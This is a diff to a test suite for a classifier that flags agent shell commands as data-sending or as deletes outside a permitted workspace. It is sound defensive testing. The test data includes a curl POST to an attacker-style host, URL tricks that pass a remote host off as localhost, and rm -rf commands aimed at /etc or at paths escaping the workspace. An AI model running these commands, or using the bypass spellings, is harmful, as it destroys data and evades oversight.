@@ -100,6 +100,23 @@ const TABLE: [string, string | undefined][] = [
 	["curl -I https://example.com", undefined],
 	["curl -X POST http://localhost:3000/api", undefined],
 	["curl -X POST http://127.0.0.1:8080/api", undefined],
+	// A local host written out, with the port or path in a variable (#142).
+	['curl -X PUT -d v "http://127.0.0.1:$PORT/keys/a"', undefined],
+	['curl -X PUT -d v "http://localhost:${PORT}/keys/$KEY"', undefined],
+	['curl -X DELETE "http://[::1]:$PORT/keys/a"', undefined],
+	["curl -X PUT -d v 127.0.0.1:$PORT/keys/a", undefined],
+	// A host that isn't written out, or isn't only a local one.
+	['curl -X POST -d x "$URL"', "send"],
+	['curl -X PUT -d v "$URL/keys/a"', "send"],
+	['URL=http://127.0.0.1:7070 && curl -X PUT -d v "$URL/keys/a"', "send"],
+	['curl -X PUT -d v "http://$HOST:7070/keys/a"', "send"],
+	['curl -X PUT -d v "http://127.0.0.1$SUFFIX/keys/a"', "send"],
+	['curl -X PUT -d v "http://localhost$SUFFIX/keys/a"', "send"],
+	['curl -X PUT -d v "http://127.0.0.1:80$X/keys/a"', "send"],
+	["curl -X POST http://127.attacker.example/x", "send"],
+	['curl -X POST "http://api.example.com?@127.0.0.1/"', "send"],
+	['curl -X POST "http://api.example.com#@127.0.0.1/"', "send"],
+	["wget --method=PUT http://$HOST/x", "send"],
 	["wget https://example.com/file.tgz", undefined],
 	["wget --post-data a=1 https://api.example.com/x", "send"],
 	["http POST api.example.com/x a=1", "send"],
@@ -334,6 +351,84 @@ describe("the floor classifier", () => {
 				assert.equal(floorAction("rm -rf ${CLAUDE_JOB_DIR}/tmp/x", at)?.kind, "delete", spaced);
 				assert.equal(floorAction('rm -rf "$CLAUDE_JOB_DIR/tmp/x"', at)?.kind, undefined, spaced);
 			}
+		});
+	});
+
+	describe("reads a name the command itself sets once, plainly, before a quoted use, as the path it holds (#141)", () => {
+		const job = "/home/qa/.claude/jobs/02878adf";
+		const where = { workspace: WORKSPACE, home: "/home/qa", jobDir: job, roots: [`${job}/tmp`] };
+		/** `[command, inside]`, each read with the Teammate's own job folder and the Workspace as its directory. */
+		const commands: [string, boolean][] = [
+			// The scratch deletes the dogfood run held.
+			['T="$CLAUDE_JOB_DIR/tmp/smoke" && rm -rf "$T"', true],
+			['M=$CLAUDE_JOB_DIR/tmp/mut; rm -rf "$M"', true],
+			['TMP=/work/effort/.scratch && D="$TMP/v1" && rm -f "$D/kv.json"', true],
+			['TMP=$PWD/.scratch && rm -rf "$TMP"', true],
+			// Other spellings of the same thing.
+			['T="${CLAUDE_JOB_DIR}"/tmp/x\nrm -rf "${T}"/y', true],
+			['TMP="$PWD"/.scratch; rm -rf "$TMP/soak2"', true],
+			['A=/work/effort/a B="$A/b"; rm -rf "$B"', true],
+			['T=/work/effort/.s && cd "$T" && rm -rf old', true],
+			['T=$PWD/.s; cd /; rm -rf "$T"', true],
+			['T=/work/effort/.s && find "$T" -name "*.log" -delete', true],
+			// The value isn't a path the floor reads.
+			['T=/etc && rm -rf "$T"', false],
+			['T=$(pwd) && rm -rf "$T"', false],
+			['T=`pwd` && rm -rf "$T"', false],
+			['T=/work/effort/x$Y && rm -rf "$T"', false],
+			['T=~/x && rm -rf "$T"', false],
+			['T=$HOME/x && rm -rf "$T"', false],
+			['T=x && rm -rf "$T"', false],
+			["T='$PWD/x' && rm -rf \"$T\"", false],
+			['cd /tmp; T=$PWD/x; rm -rf "$T"', false],
+			['PWD=/etc; T=$PWD/x; rm -rf "$T"', false],
+			['T=$U/x && rm -rf "$T"', false],
+			// The root itself, or a way out of it.
+			['T="$CLAUDE_JOB_DIR/tmp" && rm -rf "$T"', false],
+			['T="$CLAUDE_JOB_DIR"/tmp; rm -rf "$T"', false],
+			['T=/work/effort && rm -rf "$T"', false],
+			['T=/work/effort/x && rm -rf "$T/../../etc"', false],
+			['T=/work/effort && rm -rf "$T"-other', false],
+			// Assigned more than once, or named otherwise.
+			['T="$CLAUDE_JOB_DIR/tmp/x"; T=/etc; rm -rf "$T"', false],
+			['T=/work/effort/x; export T; rm -rf "$T"', false],
+			['export T=/work/effort/x; rm -rf "$T"', false],
+			['T=/work/effort/x; read -r T < f; rm -rf "$T"', false],
+			['T=/work/effort/x; unset T; rm -rf "$T"', false],
+			['T=/work/effort/x; : ${T:=/etc}; rm -rf "$T"', false],
+			['T=/work/effort/x; echo $(T=/etc); rm -rf "$T"', false],
+			// Not sure to run before the use, or run apart from it.
+			['T="$CLAUDE_JOB_DIR/tmp/x" && cmd & rm -rf "$T"', false],
+			['T=/work/effort/x & rm -rf "$T"', false],
+			['T=/work/effort/x | rm -rf "$T"', false],
+			['false && T=/work/effort/x; rm -rf "$T"', false],
+			['true || T=/work/effort/x; rm -rf "$T"', false],
+			['T=/work/effort/x || rm -rf "$T"', false],
+			['cd sub && T=/work/effort/x; rm -rf "$T"', false],
+			['rm -rf "$T"; T=/work/effort/x', false],
+			['T=/work/effort/x rm -rf "$T"', false],
+			['(T=/work/effort/x); rm -rf "$T"', false],
+			['{ T=/work/effort/x; }; rm -rf "$T"', false],
+			['if true; then T=/work/effort/x; fi; rm -rf "$T"', false],
+			['for d in a; do T=/work/effort/x; done; rm -rf "$T"', false],
+			['f() { T=/etc; }; f; rm -rf "$T"', false],
+			['T=/work/effort/x; source ./env.sh; rm -rf "$T"', false],
+			['T=/work/effort/x; eval "$CMD"; rm -rf "$T"', false],
+			["T=/work/effort/x; sh -c 'rm -rf \"$T\"'", false],
+			// Unquoted, bash splits and globs it.
+			["T=/work/effort/x; rm -rf $T", false],
+			["T=/work/effort/x; rm -rf ${T}/y", false],
+			// A name the shell gives a value of its own.
+			['RANDOM=/work/effort/x; rm -rf "$RANDOM"', false],
+		];
+		for (const [command, inside] of commands) {
+			it(`${JSON.stringify(command)} is ${inside ? "inside" : "a floor delete"}`, () => {
+				assert.equal(floorAction(command, where)?.kind, inside ? undefined : "delete");
+			});
+		}
+
+		it("lists a quoted name's word for permission rules as it is written, unmarked", () => {
+			assert.deepEqual(simpleCommands('T=/work/effort/x && rm -rf "$T"/y "${T}"'), [["rm", "-rf", "$T/y", "${T}"]]);
 		});
 	});
 
